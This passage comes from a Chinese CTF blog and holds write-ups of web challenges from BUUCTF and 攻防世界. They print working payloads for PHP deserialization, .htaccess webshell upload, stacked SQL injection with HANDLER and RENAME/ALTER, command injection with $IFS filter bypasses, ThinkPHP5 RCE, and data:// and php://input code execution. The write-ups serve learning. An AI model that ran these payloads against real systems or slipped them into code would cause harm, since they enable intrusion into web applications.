id="网鼎杯-2020-青龙组-AreUSerialz"><a href="#网鼎杯-2020-青龙组-AreUSerialz" class="headerlink" title="[网鼎杯 2020 青龙组]AreUSerialz"></a><strong>[网鼎杯 2020 青龙组]AreUSerialz</strong></h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$op</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$content</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$op</span> = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="variable">$filename</span> = <span class="string">&quot;/tmp/tmpfile&quot;</span>;</span><br><span class="line">        <span class="variable">$content</span> = <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">&quot;1&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;write();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">&quot;2&quot;</span>) &#123;</span><br><span class="line">            <span class="variable">$res</span> = <span class="keyword">$this</span>-&gt;read();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="variable">$res</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Bad Hacker!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename) &amp;&amp; <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;content)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(strlen((<span class="keyword">string</span>)<span class="keyword">$this</span>-&gt;content) &gt; <span class="number">100</span>) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Too long!&quot;</span>);</span><br><span class="line">                <span class="keyword">die</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$res</span> = file_put_contents(<span class="keyword">$this</span>-&gt;filename, <span class="keyword">$this</span>-&gt;content);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$res</span>) <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Successful!&quot;</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$res</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename)) &#123;</span><br><span class="line">            <span class="variable">$res</span> = file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$res</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">output</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;[Result]: &lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$s</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op === <span class="string">&quot;2&quot;</span>)</span><br><span class="line">            <span class="keyword">$this</span>-&gt;op = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; strlen(<span class="variable">$s</span>); <span class="variable">$i</span>++)</span><br><span class="line">        <span class="keyword">if</span>(!(ord(<span class="variable">$s</span>[<span class="variable">$i</span>]) &gt;= <span class="number">32</span> &amp;&amp; ord(<span class="variable">$s</span>[<span class="variable">$i</span>]) &lt;= <span class="number">125</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>&#123;<span class="string">&#x27;str&#x27;</span>&#125;)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$str</span> = (<span class="keyword">string</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;str&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(is_valid(<span class="variable">$str</span>)) &#123;</span><br><span class="line">        <span class="variable">$obj</span> = unserialize(<span class="variable">$str</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>​    代码审计一下，PHP反序列化的漏洞，通过控制read()读取flag.php的内容。</p><p>根据源码，构造一下序列化代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> </span><br><span class="line">class FileHandler &#123;</span><br><span class="line"> </span><br><span class="line">    protected $op = 2;</span><br><span class="line">    protected  $filename = &quot;flag.php&quot;;</span><br><span class="line">    protected  $content = &quot;abc&quot;;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">$a = new FileHandler();</span><br><span class="line">$b = serialize($a);</span><br><span class="line">echo $b;</span><br><span class="line"> </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>得到的序列化：粘贴不出后面的，被截断了，中间有不可见字符\00*\00，根据前面都是public</p><p>我们把protected改成public。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$op</span> = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$filename</span> = <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$content</span> = <span class="string">&quot;abc&quot;</span>;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> FileHandler();</span><br><span class="line"><span class="variable">$b</span> = serialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"> </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>得到序列化：</p><p><code>O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;s:3:&quot;abc&quot;;&#125;</code></p><p>通过str传参，f12查看flag。</p><p>这里有很多知识点，    </p><p><strong><em>1、is_valid()函数规定字符的ASCII码必须是32-125，即要求每个字符都是可打印的，而protected属性在序列化后会出现不可见字符\00</em>\00，转化为ASCII码不符合要求。</strong></p><p><em><strong>绕过方法有两种：</strong></em></p><p><em><strong>PHP7.1以上版本对属性类型不敏感，public属性序列化不会出现不可见字符，可以用public属性来绕过。(第一次测试就是这种方法绕过，还是public属性好啊)</strong></em></p><p><strong><em>在前面做的题目有private属性，会引入两个\x00，(\x00就是ascii的0)这个字符显示和输出看不到，甚至导致阶段，在urlencode后可以看见，所以protected属性会引入\x00</em>\x00，我们把原本的乱码替换一下即可，好像不行，返回 Bad Hacker!。这里的s表示字符串类型，要改成大写S，表示支持后面的字符串用16进制。</strong></p><p><em><strong>得到payload：</strong></em></p><p><code>?str=O:11:&quot;FileHandler&quot;:3:&#123;S:5:&quot;\00*\00op&quot;;i:2;S:11:&quot;\00*\00filename&quot;;S:8:&quot;flag.php&quot;;S:10:&quot;\00*\00content&quot;;S:3:&quot;abc&quot;;&#125;</code></p><p><strong>本题关键：确定属性个数，然后进行序列化，第一种使用public属性，由于PHP7.1以上对属性不敏感，第二种private属性，通过把小写s修改成大写s，输入不可见字符。</strong></p><h3 id="MRCTF2020-你传你🐎呢"><a href="#MRCTF2020-你传你🐎呢" class="headerlink" title="[MRCTF2020]你传你🐎呢"></a>[MRCTF2020]你传你🐎呢</h3><p>很粗俗的标题，原来是有个有关.htaccess文件上穿漏洞，这里试一下就知道了。</p><p>在前面upload已经刷过了，我们首先上传一个.htaccess文件，它可以把我们上传jpg后缀的文件解析成php，然后当作php代码执行。</p><p>在.htaccess文件输入：</p><p><code>SetHandler application/x-httpd-php</code></p><p>这样上传的jpg就会被当作php代码执行，</p><p>在上传.htaccess有个小绕过，把文件类型改成image/jpeg即可。</p><p>上传成功后，在上传一个jpg后缀的一句话木马，再次上传成功，得到文件路径。</p><p>就可以直接连接蚁剑了。</p><p>这里要特别注意<strong>文件的路径</strong>，不然后面蚁剑连接不上。</p><p>关于.htaccess详解可以看看：</p><p><a href="https://www.cnblogs.com/adforce/archive/2012/11/23/2784664.html">https://www.cnblogs.com/adforce/archive/2012/11/23/2784664.html</a></p><p><strong>本题关键：.htaccess文件上传。</strong></p><h3 id="GYCTF2020-Blacklist"><a href="#GYCTF2020-Blacklist" class="headerlink" title="[GYCTF2020]Blacklist"></a>[GYCTF2020]Blacklist</h3><p>堆叠注入，过滤了set|prepare|alter|rename|select|update|delete|drop|insert|where且不区分大小写，想通过上次修改表名还有字段名以及类型来默认查询出flag，但是rename给替换了，想不到什么方式绕过。看了一下wp，get新姿势。</p><p>可以使用handler读取表中数据。</p><p>关于handler可以看一下：<a href="https://www.jb51.net/article/88732.htm">https://www.jb51.net/article/88732.htm</a></p><p><a href="https://dev.mysql.com/doc/refman/8.0/en/handler.html(%E8%AF%AD%E6%B3%95)">https://dev.mysql.com/doc/refman/8.0/en/handler.html(语法)</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">HANDLER tbl_name OPEN [ [AS] alias]</span><br><span class="line"></span><br><span class="line">HANDLER tbl_name READ index_name &#123; = | &lt;= | &gt;= | &lt; | &gt; &#125; (value1,value2,...)</span><br><span class="line">    [ WHERE where_condition ] [LIMIT ... ]</span><br><span class="line">HANDLER tbl_name READ index_name &#123; FIRST | NEXT | PREV | LAST &#125;</span><br><span class="line">    [ WHERE where_condition ] [LIMIT ... ]</span><br><span class="line">HANDLER tbl_name READ &#123; FIRST | NEXT &#125;</span><br><span class="line">    [ WHERE where_condition ] [LIMIT ... ]</span><br><span class="line"></span><br><span class="line">HANDLER tbl_name CLOSE</span><br></pre></td></tr></table></figure><p>构造payload：</p><p><code>1&#39;;handler FlagHere open;handler FlagHere read first;#</code></p><p>我们目的是读取表中的flag，这里不用handler FlagHere close 也可以。</p><p><strong>本题关键：堆叠注入handler的使用。</strong></p><h3 id="MRCTF2020-Ez-bypass"><a href="#MRCTF2020-Ez-bypass" class="headerlink" title="[MRCTF2020]Ez_bypass"></a>[MRCTF2020]Ez_bypass</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">I put something in F12 <span class="keyword">for</span> you <span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>; <span class="variable">$flag</span>=<span class="string">&#x27;MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;&#x27;</span>; <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;gg&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>])) &#123; <span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]; <span class="variable">$gg</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;gg&#x27;</span>]; <span class="keyword">if</span> (md5(<span class="variable">$id</span>) === md5(<span class="variable">$gg</span>) &amp;&amp; <span class="variable">$id</span> !== <span class="variable">$gg</span>) &#123; <span class="keyword">echo</span> <span class="string">&#x27;You got the first step&#x27;</span>; <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>])) &#123; <span class="variable">$passwd</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>]; <span class="keyword">if</span> (!is_numeric(<span class="variable">$passwd</span>)) &#123; <span class="keyword">if</span>(<span class="variable">$passwd</span>==<span class="number">1234567</span>) &#123; <span class="keyword">echo</span> <span class="string">&#x27;Good Job!&#x27;</span>; highlight_file(<span class="string">&#x27;flag.php&#x27;</span>); <span class="keyword">die</span>(<span class="string">&#x27;By Retr_0&#x27;</span>); &#125; <span class="keyword">else</span> &#123; <span class="keyword">echo</span> <span class="string">&quot;can you think twice??&quot;</span>; &#125; &#125; <span class="keyword">else</span>&#123; <span class="keyword">echo</span> <span class="string">&#x27;You can not get it !&#x27;</span>; &#125; &#125; <span class="keyword">else</span>&#123; <span class="keyword">die</span>(<span class="string">&#x27;only one way to get the flag&#x27;</span>); &#125; &#125; <span class="keyword">else</span> &#123; <span class="keyword">echo</span> <span class="string">&quot;You are not a real hacker!&quot;</span>; &#125; &#125; <span class="keyword">else</span>&#123; <span class="keyword">die</span>(<span class="string">&#x27;Please input first&#x27;</span>); &#125; &#125;</span><br></pre></td></tr></table></figure><p>通过数组绕过第一if条件。</p><p><img src="buu/54.png"></p><p>因为md5加密数组的结果都为null值，两个比较相等。</p><p>第二个绕过也很简单，弱类型比较，post提交参数,得到flag。</p><p><img src="buu/55.png"></p><p><strong>本题关键：弱类型比较，md5绕过。</strong></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p><em><strong>1、对于sql注入，fuzz测试来检查过被过滤的符号。</strong></em></p><p><em><strong>2、在MySQL查询数据时，多加不存在的字段名，MySQL会新创建出来，不会出现语法错误。</strong></em></p><p><img src="buu/56.png"></p><p><em><strong>3、php伪协议，在ctf中php://filter很常用，php:input和data经常被过滤。</strong></em></p><p><em><strong>4、内联执行：内联，就是将反引号内命令的输出作为输入执行。</strong></em><br><em><strong>如：pingpingping那题</strong></em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1;cat$IFS$9`ls`</span><br></pre></td></tr></table></figure><p><em><strong>5、还有命令绕过空格的方法:</strong></em><br><em><strong>$IFS</strong></em><br><em><strong>IFS</strong></em><br><em><strong>{cat,flag.php}  //用逗号实现了空格功能，需要用{}括起来</strong></em><br><em><strong>6、查找cookie_secret值方法：通过ssti注入，tornado的应用框架。</strong></em><br><em><strong>7、双写绕过sql注入。</strong></em><br><em><strong>8、php字符串解析特性：php在解析时会把空格去掉。</strong></em><br><em><strong>9、函数var_dump()和scandir() var_dump(scandir(路径))</strong></em><br><em><strong>10、反斜杠被过滤了通过，char(num)来过滤。num是acsii对应的数字。</strong></em><br><em><strong>11、php反序列化漏洞，不用自己写序列化，直接利用源码，根据题目要求构造新的属性值；</strong></em><br>        <em><strong>区分三个类属性public，private还有protected。</strong></em><br>        <strong><em>后面两个会出现不可见字符，private为%00，属性名和属性值前面都会加上0，protected为\00</em>\00仅出现在属性名前。</strong>*<br><em><strong>12、新get的文件上传后缀名：phtml。</strong></em><br><em><strong>13、.user.ini和.htaccess文件上传。</strong></em><br><em><strong>14、sql注入^代替||，like代替=，括号代替空格，/</strong>/绕过空格。</em>**</p><p><em><strong>15、handler用法，查询表中数据。</strong></em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">handler 表名 open;handler 表名 read first/next ;handler 表名 close</span><br></pre></td></tr></table></figure><p><em><strong>16、MySQL，sql_mode=PIPES_AS_CONCAT，可以将||符合变成连接符。</strong></em></p>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;SUCTF-2019-EasySQL&quot;&gt;&lt;a href=&quot;#SUCTF-2019-EasySQL&quot; class=&quot;headerlink&quot; title=&quot;[SUCTF 2019]EasySQL&quot;&gt;&lt;/a&gt;[SUCTF 2019]EasySQL&lt;/h3&gt;&lt;p&gt;&lt;em&gt;&lt;strong&gt;然后各种尝试，发现了符号||有些不一样，但是没啥用，有可能是盲注，我们发现有数组，试一下堆叠注入。&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;</summary>
    
    
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>攻防世界进阶</title>
    <link href="http://example.com/2021/03/23/advanced/"/>
    <id>http://example.com/2021/03/23/advanced/</id>
    <published>2021-03-23T05:30:27.000Z</published>
    <updated>2021-07-27T01:50:01.865Z</updated>
    
    <content type="html"><![CDATA[<p>   开始攻防世界的进阶</p><span id="more"></span><h3 id="baby-web"><a href="#baby-web" class="headerlink" title="baby_web"></a>baby_web</h3><p>想想初始页面是哪个。</p><p>我们首先想到index.php，访问。</p><p>点击网络，在消息头中找到flag。</p><h3 id="Training-WWW-Robots"><a href="#Training-WWW-Robots" class="headerlink" title="Training-WWW-Robots"></a>Training-WWW-Robots</h3><p>送分题，翻译一下那段话，介绍了robots.txt协议，搜索引擎中访问网站的时候要查看的第一个文件，</p><p>我们访问一下就发现了flag的位置跟新手练习区的robots一样。</p><h3 id="php-rce"><a href="#php-rce" class="headerlink" title="php_rce"></a>php_rce</h3><p><em><strong>原理：ThinkPHP5框架底层对控制器名过滤不严，可以通过url调用到ThinkPHP框架内部的敏感函数，进而导致getshell漏洞。</strong></em></p><p>这题的漏洞是关于ThinkPHP V5，随便百度一下拿一下payload，即可执行我们想要的操作。(这里也告诉我们相关比较明显提示的漏洞我们可以直接百度)</p><p><img src="advanced.md/1.png"></p><p>命令执行成功，查找flag位置。</p><p><img src="advanced.md/2.png"></p><p>最后查看flag内容。</p><p><img src="advanced.md/3.png"></p><h3 id="Web-php-include"><a href="#Web-php-include" class="headerlink" title="Web_php_include"></a>Web_php_include</h3><p>类型：文件包含漏洞<br>echo：输出用户想查询的信息，所以往后拼接hello，？：拼接符</p><h4 id="方法一：page进行传参数，绕过while，执行其他语句，利用提交参数进行拼接，然后利用system函数进行LS查看。"><a href="#方法一：page进行传参数，绕过while，执行其他语句，利用提交参数进行拼接，然后利用system函数进行LS查看。" class="headerlink" title="方法一：page进行传参数，绕过while，执行其他语句，利用提交参数进行拼接，然后利用system函数进行LS查看。"></a>方法一：page进行传参数，绕过while，执行其他语句，利用提交参数进行拼接，然后利用system函数进行LS查看。</h4><p><code>?page=http://127.0.0.1/index.php/?hello=&lt;?system(%22ls%22);?&gt;</code><br>index.php主页面,<br><img src="advanced.md/4.png"><br>show_source:展示其他PHP网页信息。<br><code>?page=http://127.0.0.1/index.php/?hello=&lt;?show_source(&quot;fl4gisisish3r3.php&quot;);?&gt;</code>记得加引号。<br>得到flag。</p><h4 id="方法二：php伪协议"><a href="#方法二：php伪协议" class="headerlink" title="方法二：php伪协议"></a>方法二：php伪协议</h4><p>利用system函数获取的所有能够显示的文件内容，都是被浏览器进行了base64加密，不会显示在主页面上。<br>方法：?page=php://input    POST提交<?php php代码?><br>php://在使用时存在大小写区别，可大小写绕过。</p><p>这里使用hackbar一直提交失败，使用burp才成功了。</p><p><img src="advanced.md/5.png"></p><h4 id="方法三：封装协议-data"><a href="#方法三：封装协议-data" class="headerlink" title="方法三：封装协议-data://"></a>方法三：封装协议-data://</h4><p>区别在于用get提交<br><code>?page=data://text/plain,&lt;?php system(&#39;ls&#39;);?&gt;</code></p><p><img src="advanced.md/6.png"></p><h3 id="supersqli"><a href="#supersqli" class="headerlink" title="supersqli"></a>supersqli</h3><p>题目描述：随便注，来自强网杯2019</p><p>一看就是sql注入题目。</p><p>首先判断一下注入类型</p><p>为字符型，单引号。</p><p>判断字段数</p><p><img src="advanced.md/7.png"></p><p>3报错，2正常回显，所以字段数为2。</p><p>直接开始联合查询注入，</p><p><img src="advanced.md/8.png"></p><p>有一个正则表达式，把联合注入语句部分代码过滤了，这里我们试一下堆叠注入。</p><p><img src="advanced.md/9.png">可以爆出数据，</p><p>也可以爆出表。</p><p><img src="advanced.md/10.png"></p><p>有两个表，这里不需要选择表，应该默认指定数据库，但是可以猜出数据库就是supersql，再加from supersql 果然这两个表属于supersql。</p><p>查询一下两个表名的字段，</p><p><img src="advanced.md/11.png"></p><p><img src="advanced.md/12.png"></p><p><strong>记得字符串为表名操作时记得加反引号</strong></p><p>观察两个表的字段，可以知道words表是默认查询的表，传入inject参数的值也就是赋值给了id。</p><p>所以我们可以修改数字表名为words表名，再修改flag为id这个字段，即可查询flag值，尝试一下。</p><p>使用rename修改表名，再使用alter修改字段名，这里记得要先把原来的words表名修改，不然修改不了。</p><p>语法：</p><p><em><strong>修改表名</strong></em></p><p><em><strong>rename table 表名1 to 表名2</strong></em></p><p><em><strong>修改字段名</strong></em></p><p><em><strong>alter table 表名 change 字段名1 字段名2 数据类型。</strong></em></p><p><img src="advanced.md/13.png"></p><p>输入1’ or ‘1’=’1 获得flag。</p><p><img src="advanced.md/14.png"></p><p>本题要一气呵成，如果分开写，后面会报错，导致无法执行我们想要执行的代码。</p><h3 id="ics-06"><a href="#ics-06" class="headerlink" title="ics-06"></a>ics-06</h3><p>发现url有个id值，想了半天不知道怎么弄，直接爆破id值结果就出来了。</p><h3 id="Warm-up-代码审计"><a href="#Warm-up-代码审计" class="headerlink" title="Warm up(代码审计)"></a>Warm up(代码审计)</h3><p>先F12查看源码，看到注释source.php，<br><img src="advanced.md/4.png"><br>访问一下，页面出现源码，</p><p><img src="advanced.md/15.png"></p><p>发现一个hint.php先访问，<br><img src="advanced.md/16.png">发现flag在ffffllllaaaagggg里(暗示要访问四层目录)。再回去审查代码，<br>可以看到最后的include 是可以动态构造参数的，那应该就是解题关键了。<br>不过要经过三个判断</p><p>第一个：检查一个变量是否为空</p><p>第二个：是否为字符串</p><p>第三个：通过函数来检查</p><p>我们要构造的payload本身就满足前两点所以无视</p><p>重要是第三点的这个函数</p><p>函数作用是分三步检查传进来的参数是否满足白名单：</p><p>$whitelist = [“source”=&gt;”source.php”,”hint”=&gt;”hint.php”];</p><p>$_REQUEST 是通过 GET，POST 和 COOKIE 输入机制来传递参数，这里通过get传参。</p><p>后面就是构造payload，访问多个目录，得到flag</p><p><img src="advanced.md/17.png"></p><h3 id="NewsCenter"><a href="#NewsCenter" class="headerlink" title="NewsCenter"></a>NewsCenter</h3><p>这是一题简单sql注入题，不存在任何过滤。</p><p>方法一：手工注入</p><p><img src="advanced/19.png"></p><p>上传了爆表的，其它的类似。。。(记得把前面置空，不然查询的不是我们想要的结果)</p><p>方法二 sqlmap爆破</p><p><img src="advanced/20.png"></p><p>记得数据要加””,这种方式是通过post提交。</p><h3 id="NaNNaNNaNNaN-Batman"><a href="#NaNNaNNaNNaN-Batman" class="headerlink" title="NaNNaNNaNNaN-Batman"></a>NaNNaNNaNNaN-Batman</h3><p>下载文件，通过浏览器方式打开，有一个post提交的，但是输入什么都无反应，</p><p>再用记事本打开是一段js代码(乱码了)，发现代码末尾有一个函数eval，修改成alert即可弹出正常代码。(文件保存格式要.html格式)</p><p><img src="advanced/21.png"></p><p>审计一下代码，大概看得懂，因为没学过js代码，想把它转成python代码运行，其实没必要，在控制台即可输入js代码，得到结果。</p><p><img src="advanced/22.png"></p><p>PHP in_array() 函数<br>in_array() 函数搜索数组中是否存在指定的值。<br>注释：如果 search 参数是字符串且 type 参数被设置为 TRUE，则搜索区分大小写。<br>in_array(search,array,type)<br>1.函数mb_substr(a,m,n)：截取a字符串第m位到第n位的内容并返回<br>2.函数mb_strpos(b,x)：获取b字符串中，x字符/字符串第一次出现的位置<br>3.include目录穿越：include会把第一个/后面的路径作为访问路径来寻找文件<br>解密：逆向加法运算，base64解密，python脚本：<br>import base64<br>def python_decode(string):<br>    zimu = “abcdefghijklmnopqrstuvwxyz”<br>    rot_13 =””<br>    for i in string:<br>        if i.isdigit():<br>            rot_13 += i<br>        else:<br>            try:<br>                rot_13 += zimu[zimu.index(i)-13]<br>            except:<br>                rot_13 += zimu[zimu.index(i.lower())-13].upper()<br>    fz = rot_13[::-1]<br>    base = base64.b64decode(fz)<br>    base = [chr(ord(i)-1) for i in base]<br>    fz = base[::-1]<br>    print “”.join(fz)</p><p>python_decode(“a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws”)</p><p>​    </p>]]></content>
    
    
    <summary type="html">&lt;p&gt;   开始攻防世界的进阶&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>攻防学习</title>
    <link href="http://example.com/2021/03/22/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"/>
    <id>http://example.com/2021/03/22/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/</id>
    <published>2021-03-22T12:58:34.000Z</published>
    <updated>2021-07-27T01:48:38.577Z</updated>
    
